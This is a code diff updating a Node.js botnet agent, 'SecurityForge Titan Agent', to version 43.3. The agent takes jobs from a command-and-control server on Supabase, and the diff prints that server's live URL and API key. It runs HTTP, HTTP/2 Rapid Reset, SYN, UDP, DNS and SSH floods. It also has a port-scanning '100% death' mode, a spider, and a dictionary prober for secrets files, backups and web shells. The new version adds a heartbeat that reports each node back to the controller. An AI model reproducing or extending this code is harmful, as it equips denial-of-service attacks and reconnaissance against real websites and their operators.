@@ -1,11 +1,10 @@
 /**
- * SECURITYFORGE TITAN AGENT V43.2 (FINAL VORTEX)
+ * SECURITYFORGE TITAN AGENT V43.3 (VORTEX FINAL)
  * 
  * [PATCH LOG]
- * - FIXED: ERR_HTTP2_GOAWAY_SESSION (Auto-reconnect on server session termination)
- * - FEATURE: Dynamic Spider (Parses HTML for hidden paths)
- * - FEATURE: Deep Admin Hunter (50+ Dictionary Paths)
- * - FEATURE: Vortex Mode "100% Death" (IP Resolve -> Port Scan -> Auto-Targeting)
+ * - FIXED: Regex Syntax Error in Spider
+ * - FEATURE: Swarm Heartbeat (Node Tracking)
+ * - FEATURE: Auto-Targeting Optimization
  */
 
 const https = require('https');
@@ -16,6 +15,7 @@ const tls = require('tls');
 const dgram = require('dgram');
 const crypto = require('crypto');
 const dns = require('dns');
+const os = require('os');
 
 // ==========================================
 // 1. CONFIGURATION
@@ -23,9 +23,15 @@ const dns = require('dns');
 const C2_CONFIG = {
     url: "https://qbedywgbdwxaucimgiok.supabase.co",
     key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo",
-    pollInterval: 800,
-    reportInterval: 2000
+    pollInterval: 1000,
+    reportInterval: 2000,
+    heartbeatInterval: 15000
 };
+
+// Generate a quasi-stable ID based on hostname to prevent counter inflation on restarts if possible
+const MACHINE_ID = crypto.createHash('md5').update(os.hostname()).digest('hex').substring(0, 12);
+const SESSION_ID = crypto.randomBytes(4).toString('hex');
+const NODE_ID = `${MACHINE_ID}-${SESSION_ID}`;
 
 const STATE = {
     activeJob: null,
@@ -45,7 +51,8 @@ const STATE = {
     activeTargets: new Set(), // Ports currently under attack
     resolvedIp: null,
     dynamicPaths: [], // Paths found via Spidering
-    lastReport: 0
+    lastReport: 0,
+    lastHeartbeat: 0
 };
 
 // ==========================================
@@ -81,16 +88,12 @@ const HTTP2_HEADERS = {
 
 // Deep Dictionary for Static Recon
 const DEEP_ADMIN_PATHS = [
-    // Configs & Secrets
     '/.env', '/config.php', '/config.json', '/web.config', '/.git/config', '/.git/HEAD',
     '/docker-compose.yml', '/package.json', '/composer.json', '/secrets.yml',
-    // Database
     '/backup.sql', '/database.sql', '/dump.sql', '/backup.zip', '/www.zip', '/site.tar.gz',
-    // Admin Panels
     '/admin', '/wp-admin', '/administrator', '/dashboard', '/cpanel', '/phpmyadmin',
     '/adminer.php', '/login', '/user', '/member', '/api/health', '/telescope',
     '/horizon', '/jenkins', '/grafana', '/kibana', '/zabbix',
-    // Backdoors / Shells
     '/shell.php', '/cmd.php', '/root.php', '/1.php', '/x.php', '/upl.php',
     '/api/.env', '/v1/.env', '/sftp-config.json'
 ];
@@ -108,7 +111,7 @@ const log = (msg, type = 'INFO') => {
     }
 };
 
-const makeSupabaseRequest = (method, path, body = null) => {
+const makeSupabaseRequest = (method, path, body = null, headers = {}) => {
     return new Promise((resolve) => {
         const url = new URL(`${C2_CONFIG.url}/rest/v1/${path}`);
         const options = {
@@ -119,7 +122,7 @@ const makeSupabaseRequest = (method, path, body = null) => {
                 'apikey': C2_CONFIG.key,
                 'Authorization': `Bearer ${C2_CONFIG.key}`,
                 'Content-Type': 'application/json',
-                'Prefer': 'return=representation'
+                ...headers
             }
         };
         const req = https.request(options, (res) => {
@@ -157,7 +160,6 @@ const runHttpFlood = (job, target) => {
     const attack = () => {
         if (!STATE.running) return;
         
-        // Spider Integration: Randomly pick a dynamically found path
         let path = target.path;
         if (STATE.dynamicPaths.length > 0 && Math.random() > 0.7) {
             path = STATE.dynamicPaths[Math.floor(Math.random() * STATE.dynamicPaths.length)];
@@ -185,7 +187,7 @@ const runHttpFlood = (job, target) => {
     for(let i=0; i<5; i++) attack(); 
 };
 
-// FIXED: Robust HTTP/2 with Error Handling for GOAWAY/Refused Stream
+// Robust HTTP/2 with Error Handling
 const runHttp2Flood = (job, target) => {
     if (!target.isSsl) return;
     
@@ -197,28 +199,19 @@ const runHttp2Flood = (job, target) => {
             peerMaxConcurrentStreams: 5000 
         });
         
-        // Handle Session-Level Errors
-        client.on('error', () => { 
-            STATE.stats.failed++;
-            // Reconnect handled by close/destroy logic below
-        });
-        
-        client.on('goaway', () => {
-            client.destroy(); // Server said stop, so we stop and let the loop reconnect
-        });
+        client.on('error', () => { STATE.stats.failed++; });
+        client.on('goaway', () => { client.destroy(); });
 
         const spam = () => {
             if (!STATE.running) { client.destroy(); return; }
 
             if (client.destroyed || client.closed) {
-                 setTimeout(connect, 200); // Reconnect
+                 setTimeout(connect, 200); 
                  return;
             }
             
-            // Batch requests
             for (let i=0; i<50; i++) {
                 if (client.destroyed || client.closed) break;
-                
                 try {
                     const req = client.request({ 
                         ':path': target.path, 
@@ -226,24 +219,15 @@ const runHttp2Flood = (job, target) => {
                         ...HTTP2_HEADERS 
                     });
                     req.on('response', () => STATE.stats.success++);
-                    req.on('error', (err) => {
-                        STATE.stats.failed++;
-                        // Stream error, typically we just continue
-                    });
+                    req.on('error', () => {}); // Metrics handled by main error handler usually
                     req.end();
-                    
-                    // Rapid Reset Vector
                     if (job.use_god_mode) req.close(http2.constants.NGHTTP2_CANCEL);
-
                 } catch (err) {
                     STATE.stats.failed++;
-                    // Synchronous error (e.g., ERR_HTTP2_GOAWAY_SESSION) means session is dead.
-                    // Destroy it to force a clean reconnect in the next tick.
                     client.destroy();
                     break; 
                 }
             }
-            
             if (STATE.running && !client.destroyed) setTimeout(spam, 10);
             else if (STATE.running) setTimeout(connect, 200);
         };
@@ -252,7 +236,6 @@ const runHttp2Flood = (job, target) => {
     connect();
 };
 
-// --- NETJAM & INFRA (RAW SOCKETS) ---
 const runSocketStress = (job, target, type, portOverride = null) => {
     let port = portOverride;
     if (!port) {
@@ -294,7 +277,6 @@ const runSocketStress = (job, target, type, portOverride = null) => {
 // 5. INTELLIGENCE (SPIDER & VORTEX)
 // ==========================================
 
-// --- DYNAMIC SPIDER (HTML PARSER) ---
 const runSpider = (target) => {
     if (!STATE.running) return;
     const lib = target.isSsl ? https : http;
@@ -305,7 +287,8 @@ const runSpider = (target) => {
         let body = '';
         res.on('data', chunk => body += chunk);
         res.on('end', () => {
-            const linkRegex = /(?:href|src|action)=["'](/[^"']+)["']/g;
+            // FIXED REGEX SYNTAX
+            const linkRegex = /(?:href|src|action)=["'](\/[^"']+)["']/g;
             let match;
             let count = 0;
             while ((match = linkRegex.exec(body)) !== null) {
@@ -319,11 +302,9 @@ const runSpider = (target) => {
         });
     }).on('error', () => {});
     
-    // Recurse occasionally to find new paths if page changes
     setTimeout(() => runSpider(target), 5000);
 };
 
-// --- ADMIN HUNTER (STATIC DICTIONARY) ---
 const runAdminHunter = (target) => {
     if (!STATE.running) return;
     const lib = target.isSsl ? https : http;
@@ -331,21 +312,18 @@ const runAdminHunter = (target) => {
 
     const crawl = () => {
         if (!STATE.running || pathIdx >= DEEP_ADMIN_PATHS.length) return;
-        
-        // Batch 5 paths
         for(let i=0; i<5 && pathIdx < DEEP_ADMIN_PATHS.length; i++) {
             const path = DEEP_ADMIN_PATHS[pathIdx++];
             const req = lib.get({
                 host: target.host, port: target.port, path: path, rejectUnauthorized: false,
                 headers: { 'User-Agent': USER_AGENTS[0] }
             }, (res) => {
-                // If it's not a 404, we found something
                 if (res.statusCode < 404 || res.statusCode === 401 || res.statusCode === 403) {
                     const msg = `HUNTER: FOUND ${path} [${res.statusCode}]`;
                     if(!STATE.discovered.has(msg)) { 
                         STATE.discovered.add(msg); 
                         log(msg, 'FOUND'); 
-                        STATE.dynamicPaths.push(path); // Add to attack queue
+                        STATE.dynamicPaths.push(path);
                     }
                 }
             });
@@ -357,20 +335,14 @@ const runAdminHunter = (target) => {
     crawl();
 };
 
-// --- VORTEX MODE (100% DEATH) ---
 const runVortex = (job, target) => {
     log('VORTEX: Resolving Origin IP...', 'warning');
-    
-    // 1. Resolve IP
     dns.resolve4(target.host, (err, addresses) => {
         if (!err && addresses && addresses.length > 0) {
             STATE.resolvedIp = addresses[0];
             log(`VORTEX: LOCKED ON IP ${STATE.resolvedIp}`, 'SUCCESS');
-            
-            // 2. Scan Critical Ports
             const deathPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 5900, 8000, 8080, 8443, 27017];
             log(`VORTEX: Scanning ${deathPorts.length} vectors on ${STATE.resolvedIp}...`, 'INFO');
-            
             deathPorts.forEach(port => {
                 const s = new net.Socket();
                 s.setTimeout(2000);
@@ -379,9 +351,7 @@ const runVortex = (job, target) => {
                     if(!STATE.discovered.has(msg)) {
                         STATE.discovered.add(msg);
                         log(msg, 'OPEN');
-                        
                         const attackType = (port === 53) ? 'DNS' : (port === 22) ? 'SSH' : 'TCP';
-                        // Spawn 20 threads per open port
                         for(let k=0; k<20; k++) runSocketStress(job, target, attackType, port);
                     }
                     s.destroy();
@@ -407,27 +377,23 @@ const startJob = (job) => {
     STATE.dynamicPaths = [];
     STATE.resolvedIp = null;
     
-    log(`TITAN V43.2 | TARGET: ${job.target} | METHOD: ${job.method}`);
+    log(`TITAN V43.3 | TARGET: ${job.target} | METHOD: ${job.method}`);
     const target = getTargetDetails(job.target);
     if (!target) return;
 
-    // --- RECON PHASE ---
     if (job.use_100_percent_death) {
         log('WARNING: 100% DEATH (VORTEX) MODE ENGAGED.', 'warning');
-        runVortex(job, target);     // IP + Port Scan + Attack
-        runSpider(target);          // Dynamic HTML
-        runAdminHunter(target);     // Static Dictionary
+        runVortex(job, target);
+        runSpider(target);
+        runAdminHunter(target);
     } else {
         if (job.use_admin_hunter) {
-            runSpider(target);      // Dynamic HTML
-            runAdminHunter(target); // Static Dictionary
+            runSpider(target);
+            runAdminHunter(target);
         }
     }
 
-    // --- MAIN ATTACK THREADS ---
-    // These run in parallel to VORTEX threads to ensure URL is hit even if ports are closed
     const threads = Math.min(job.concurrency || 50, 500);
-
     for (let i = 0; i < threads; i++) {
         if (job.use_syn_flood) runSocketStress(job, target, 'TCP');
         else if (job.method === 'UDP') runSocketStress(job, target, 'UDP');
@@ -441,7 +407,20 @@ const stopJob = () => {
     log("ENGINE STOPPED");
 };
 
-// Loop and Server Setup
+// --- HEARTBEAT SYSTEM ---
+setInterval(() => {
+    const now = Date.now();
+    if (now - STATE.lastHeartbeat > C2_CONFIG.heartbeatInterval) {
+        makeSupabaseRequest('POST', 'swarm_nodes', {
+            node_id: NODE_ID,
+            last_seen: new Date().toISOString(),
+            ip: STATE.resolvedIp || 'unknown',
+            version: 'V43.3'
+        }, { 'Prefer': 'resolution=merge-duplicates' }).catch(() => {});
+        STATE.lastHeartbeat = now;
+    }
+}, 5000);
+
 setInterval(async () => {
     if (STATE.running && STATE.activeJob) {
         const now = Date.now();
@@ -486,5 +465,5 @@ setInterval(async () => {
     }
 }, C2_CONFIG.pollInterval);
 
-http.createServer((req, res) => res.end('Titan V43.2 Vortex Stable')).listen(process.env.PORT || 3000);
-console.log('SecurityForge Titan Agent V43.2 (Vortex Stable) Online');
+http.createServer((req, res) => res.end('Titan V43.3 Vortex Online')).listen(process.env.PORT || 3000);
+console.log('SecurityForge Titan Agent V43.3 (Vortex Final) Online | ID: ' + NODE_ID);
